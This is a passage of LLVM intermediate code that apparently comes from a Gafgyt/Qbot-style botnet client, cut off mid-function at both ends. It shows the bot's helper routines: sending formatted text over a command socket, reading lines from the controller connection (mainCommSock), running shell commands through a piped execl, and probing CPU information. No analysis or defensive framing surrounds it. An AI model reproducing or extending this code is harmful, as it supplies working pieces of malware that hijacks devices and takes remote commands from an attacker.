  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #3, !srcloc !13
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #3
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #3
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
